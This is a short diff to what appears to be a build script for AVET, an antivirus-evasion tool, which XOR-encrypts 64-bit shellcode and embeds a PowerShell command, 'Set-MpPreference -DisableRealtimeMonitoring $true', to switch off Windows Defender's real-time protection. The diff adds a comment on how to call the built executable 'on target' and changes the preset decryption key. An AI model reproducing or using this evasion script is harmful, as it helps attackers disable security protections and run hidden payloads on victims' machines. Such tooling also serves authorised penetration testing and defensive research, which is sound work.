@@ -2,6 +2,8 @@
 # Execute 64-bit shellcode.
 # Encrypts the payload with a dynamic XOR key, which needs to be provided via command line argument 2 to decrypt.
 # Attempts to disable Windows Defender's real-time protection via Powershell command "Set-MpPreference -DisableRealtimeMonitoring $true".
+#
+# Call on target like:  output.exe first aabbccddee
 
 
 # print AVET logo
@@ -30,7 +32,7 @@ set_command_source static_from_here 'Set-MpPreference -DisableRealtimeMonitoring
 set_command_exec exec_via_powershell
 
 # generate key file
-generate_key preset aabbcc12de input/key_raw.txt
+generate_key preset aabbccddee input/key_raw.txt
 
 # encrypt payload
 encode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt
